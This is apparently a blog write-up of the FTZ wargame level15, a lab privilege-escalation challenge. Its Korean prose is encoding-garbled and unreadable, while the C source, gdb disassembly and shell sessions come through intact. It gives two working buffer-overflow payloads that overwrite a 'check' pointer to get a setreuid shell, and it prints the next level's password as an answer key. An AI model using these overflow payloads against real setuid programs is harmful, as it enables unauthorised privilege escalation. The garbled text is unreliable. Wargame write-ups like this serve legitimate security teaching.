---
title: "[FTZ] level15 í’€ì´"
categories:
  - ftz
tags:
  - FTZ
toc: true
toc_sticky: true
toc_label: "level15 í’€ì´"
toc_icon: "bookmark"
author_profile: true
header:
  teaser: /assets/images/ftz.png
---

ğŸ’¡ FTZ level15 í’€ì´
{: .notice--warning}


# ë¬¸ì œ

ê³„ì • : level15/guess what

**hint**
```c
#include <stdio.h>

main()
{ int crap;
  int *check;
  char buf[20];
  fgets(buf,45,stdin);
  if (*check==0xdeadbeef)
   {
     setreuid(3096,3096);
     system("/bin/sh");
   }
}

```

# í’€ì´
ì´ë²ˆ ë¬¸ì œëŠ” 2ê°€ì§€ì˜ ë°©ë²•ìœ¼ë¡œ í’€ì–´ë³´ê² ìŠµë‹ˆë‹¤.

## í™˜ê²½ë³€ìˆ˜
ê³„ì† ì´ìš©í•˜ë˜ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ ë¬¸ì œë¥¼ í•´ê²°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•˜ì§€ë§Œ ì´ì „ ë¬¸ì œë“¤ê³¼ ë‹¤ë¥´ê²Œ ì£¼ì˜ë¥¼ í•´ì•¼ í•˜ëŠ” ë¶€ë¶„ì´ ì¡´ì¬í•©ë‹ˆë‹¤.

ì´ë²ˆ ë¬¸ì œëŠ” ret ì£¼ì†Œë¥¼ ë®ì–´ ì“°ëŠ”ê²Œ ì•„ë‹Œ, check ë³€ìˆ˜ë¥¼ ë®ì–´ì¨ì„œ check ë³€ìˆ˜ì˜ í¬ì¸í„°ê°€ ê°€ë¦¬í‚¤ê³  ìˆëŠ” ìœ„ì¹˜ì— 0xdeadbeef ê°’ì´ ìˆìœ¼ë©´ ì‰˜ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ë¥¸ ì‰˜ì„ ë”°ëŠ” ë¬¸ì œë“¤ì—ì„œëŠ” í™˜ê²½ë³€ìˆ˜ì˜ ìœ„ì¹˜ê°€ ëª‡ ë°”ì´íŠ¸ ë‹¤ë¥´ê²Œ ë‚˜ì™€ë„ nop(0x90) ë¬¸ìë¥¼ ì´ìš©í•˜ì—¬ ë³´ì™„í•´ ì¤¬ë‹¤ë©´, ì´ë²ˆ ë¬¸ì œì—ì„œëŠ” 1ë°”ì´íŠ¸ë¼ë„ ë‹¤ë¥´ë©´ segmentation falut ì˜¤ë¥˜ê°€ ë°œìƒí•©ë‹ˆë‹¤.

ìš°ì„  'ì •í™•í•˜ê²Œ' í™˜ê²½ë³€ìˆ˜ì˜ ìœ„ì¹˜ë¥¼ ë§ì¶”ê¸° ìœ„í•´ì„œ ì•Œì•„ì•¼ í•˜ëŠ” ì‚¬í•­ì€ í™˜ê²½ë³€ìˆ˜ê°€ ìŠ¤íƒì— ë¶ˆëŸ¬ì§„ë‹¤ëŠ” ì‚¬ì‹¤ê³¼, ì´ ë³€ìˆ˜ë“¤ì€ ì‹¤í–‰ í”„ë¡œê·¸ë¨ ì´ë¦„ì— ê¸¸ì´ì— ì˜í–¥ì„ ë°›ëŠ”ë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.

ë‹¤ìŒì˜ ì½”ë“œë¥¼ ë³´ë©´ ê°™ì€ í™˜ê²½ë³€ìˆ˜ ì£¼ì†Œë¥¼ êµ¬í•˜ëŠ” ì½”ë“œì§€ë§Œ ì´ë¦„ì´ 1ê¸€ì ì°¨ì´ì—  ìœ„ì¹˜ê°€ 2 byte ì°¨ì´ê°€ ë‚˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```sh
[level15@ftz tmp]$ echo 'int main(){printf("%p\n",getenv("CHECK"));}'>> env.c
[level15@ftz tmp]$ gcc -o env12345 env.c
[level15@ftz tmp]$ gcc -o env1234 env.c
[level15@ftz tmp]$ gcc -o env123 env.c
[level15@ftz tmp]$ ./env123
0xbffffcc3
[level15@ftz tmp]$ ./env1234
0xbffffcc1
[level15@ftz tmp]$ ./env12345
0xbffffcbf
```

ë”°ë¼ì„œ ì´ë²ˆì—ëŠ” í™˜ê²½ë³€ìˆ˜ë¥¼ ì •í™•í•˜ê²Œ ì–»ê¸° ìœ„í•´ì„œ attackme í”„ë¡œê·¸ë¨ì˜ ì´ë¦„ ê¸¸ì´ê°€ 8ìë¦¬ ì´ë¯€ë¡œ env12345 í”„ë¡œê·¸ë¨ìœ¼ë¡œ êµ¬í•œ **0xbffffcbf**ì£¼ì†Œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

gdbë¥¼ ì´ìš©í•˜ì—¬ buf ìœ„ì¹˜ì™€ check ë³€ìˆ˜ì˜ ìœ„ì¹˜ê°€ ì–¼ë§Œí¼ ì°¨ì´ë‚˜ëŠ”ì§€ í™•ì¸ í•©ë‹ˆë‹¤.

```sh
[level15@ftz level15]$ gdb -q attackme
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
0x08048490 <main+0>:    push   ebp
0x08048491 <main+1>:    mov    ebp,esp
0x08048493 <main+3>:    sub    esp,0x38
0x08048496 <main+6>:    sub    esp,0x4
0x08048499 <main+9>:    push   ds:0x8049664
0x0804849f <main+15>:   push   0x2d
0x080484a1 <main+17>:   lea    eax,[ebp-56]       //buf ìœ„ì¹˜
0x080484a4 <main+20>:   push   eax
0x080484a5 <main+21>:   call   0x8048360 <fgets>
0x080484aa <main+26>:   add    esp,0x10
0x080484ad <main+29>:   mov    eax,DWORD PTR [ebp-16]   //check ìœ„ì¹˜
0x080484b0 <main+32>:   cmp    DWORD PTR [eax],0xdeadbeef
0x080484b6 <main+38>:   jne    0x80484dd <main+77>
0x080484b8 <main+40>:   sub    esp,0x8
0x080484bb <main+43>:   push   0xc18
0x080484c0 <main+48>:   push   0xc18
0x080484c5 <main+53>:   call   0x8048380 <setreuid>
0x080484ca <main+58>:   add    esp,0x10
0x080484cd <main+61>:   sub    esp,0xc
0x080484d0 <main+64>:   push   0x8048548
0x080484d5 <main+69>:   call   0x8048340 <system>
0x080484da <main+74>:   add    esp,0x10
0x080484dd <main+77>:   leave
0x080484de <main+78>:   ret
0x080484df <main+79>:   nop
End of assembler dump.

```

ì´ 40ë°”ì´íŠ¸ì˜ ìœ„ì¹˜ê°€ ì°¨ì´ ë‚©ë‹ˆë‹¤.

ë”°ë¼ì„œ dummy ë¬¸ìë¡œ 40ë°”ì´íŠ¸ë¥¼ ì²´ìš´ ë’¤, í™˜ê²½ ë³€ìˆ˜ ì£¼ì†Œë¥¼ ì…ë ¥í•´ ì¤ë‹ˆë‹¤.
ì„±ê³µì ìœ¼ë¡œ ì‰˜ì„ íšë“í–ˆìŠµë‹ˆë‹¤.

```sh
[level15@ftz level15]$ (python -c'print("A"*40+"\xbf\xfc\xff\xbf")';cat)|./attackme

id
uid=3096(level16) gid=3095(level15) groups=3095(level15)

my-pass
Level16 Password is "about to cause mass".
```

## ìŠ¤íƒì—ì„œ ì°¾ê¸°

checkì˜ í¬ì¸í„°ì˜ ê°’ê³¼ **0xdeadbeef** ê°’ì„ ë¹„êµë¥¼ í•˜ê¸° ìœ„í•´ì„œ ë¶„ëª…íˆ ë©”ëª¨ë¦¬ ìƒì— **0xdeadbeef** ê°’ì„ ì €ì¥í•œ ìœ„ì¹˜ê°€ ìˆì„ ê²ƒì…ë‹ˆë‹¤.

ì´ë²ˆì—ëŠ” ê·¸ ê°’ì„ ì°¾ì•„ì„œ í•´ê²°í•´ ë³´ê² ìŠµë‹ˆë‹¤.

ë¨¼ì € ë””ë²„ê¹…ì„ ìœ„í•´ì„œ attackme íŒŒì¼ì„ tmpí´ë”ë¡œ ë³µì‚¬í•œ ë’¤ì— gdbë¥¼ ì‹¤í–‰ì‹œì¼œ ì¤ë‹ˆë‹¤.

```sh
[level15@ftz tmp]$ gdb -q attackme
(gdb) set disas intel
(gdb) disass main
Dump of assembler code for function main:
0x08048490 <main+0>:    push   ebp
0x08048491 <main+1>:    mov    ebp,esp
0x08048493 <main+3>:    sub    esp,0x38
0x08048496 <main+6>:    sub    esp,0x4
0x08048499 <main+9>:    push   ds:0x8049664
0x0804849f <main+15>:   push   0x2d
0x080484a1 <main+17>:   lea    eax,[ebp-56]
0x080484a4 <main+20>:   push   eax
0x080484a5 <main+21>:   call   0x8048360 <fgets>
0x080484aa <main+26>:   add    esp,0x10
0x080484ad <main+29>:   mov    eax,DWORD PTR [ebp-16]
0x080484b0 <main+32>:   cmp    DWORD PTR [eax],0xdeadbeef //ë¸Œë ˆì´í¬ ì§€ì 
0x080484b6 <main+38>:   jne    0x80484dd <main+77>
0x080484b8 <main+40>:   sub    esp,0x8
0x080484bb <main+43>:   push   0xc18
0x080484c0 <main+48>:   push   0xc18
0x080484c5 <main+53>:   call   0x8048380 <setreuid>
0x080484ca <main+58>:   add    esp,0x10
0x080484cd <main+61>:   sub    esp,0xc
0x080484d0 <main+64>:   push   0x8048548
0x080484d5 <main+69>:   call   0x8048340 <system>
0x080484da <main+74>:   add    esp,0x10
0x080484dd <main+77>:   leave
0x080484de <main+78>:   ret
0x080484df <main+79>:   nop
End of assembler dump.

```

í¬ì¸í„° ê°’ê³¼ 0xdeadbeef ê°’ì„ ë¹„ê³ ã…›í•˜ëŠ” ì§€ì ì¸ main+32ì£¼ì†Œì— ë¸Œë ˆì´í¬ë¥¼ ê±¸ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.

```sh
(gdb) b *main+32
Breakpoint 1 at 0x80484b0
(gdb) run
Starting program: /home/level15/tmp/attackme
test

Breakpoint 1, 0x080484b0 in main ()
(gdb) info reg
eax            0xbffff138       -1073745608
ecx            0x5      5
edx            0x4212e130       1108533552
ebx            0x42130a14       1108544020
esp            0xbffff100       0xbffff100
ebp            0xbffff138       0xbffff138
esi            0x40015360       1073828704
edi            0x8048520        134513952
eip            0x80484b0        0x80484b0
eflags         0x286    646
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x33     51
```

eip ì§€ì ì— ëŒ€í•´ì„œ 16ê°œì˜ wordë¥¼ ì¶œë ¥í•´ ë´…ë‹ˆë‹¤.

```sh
(gdb) x/16xw $eip
0x80484b0 <main+32>:    0xbeef3881      0x2575dead      0x6808ec83      0x00000c18
0x80484c0 <main+48>:    0x000c1868      0xfeb6e800      0xc483ffff      0x0cec8310
0x80484d0 <main+64>:    0x04854868      0xfe66e808      0xc483ffff      0x90c3c910
0x80484e0 <__do_global_ctors_aux>:      0x53e58955      0xa104ec83      0x0804962c      0x04962cbb
(gdb)
```

ë§¨ ì²˜ìŒ 2ê°œì˜ wordë¥¼ ë³´ë©´ beefì™€ deadê°€ ë‚˜ëˆ„ì–´ì„œ ì €ì¥ë˜ì–´ ìˆëŠ”ê²Œ ë³´ì…ë‹ˆë‹¤.
í˜„ì¬ ì£¼ì†Œê°€ 0xb0ìœ¼ë¡œ ëë‚˜ë¯€ë¡œ 2ë°”ì´íŠ¸ë¥¼ ë°€ì–´ì„œ ì¶œë ¥í•´ ë´…ë‹ˆë‹¤.

```sh
(gdb) x/2xw 0x80484b2
0x80484b2 <main+34>:    0xdeadbeef      0xec832575
(gdb)
```

0xdeadbeefê°€ ì €ì¥ëœ ë©”ëª¨ë¦¬ ì£¼ì†ŒëŠ” 0x80484b2ì…ë‹ˆë‹¤.

ì´ë¥¼ ì´ìš©í•´ì„œ check ê°’ì„ í•´ë‹¹ ë©”ëª¨ë¦¬ ì£¼ì†Œë¡œ ë®ì–´ì£¼ë©´ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```sh
[level15@ftz level15]$ (python -c 'print("A"*40+"\xb2\x84\x04\x08")';cat) | ./attackme
id
uid=3096(level16) gid=3095(level15) groups=3095(level15)
```
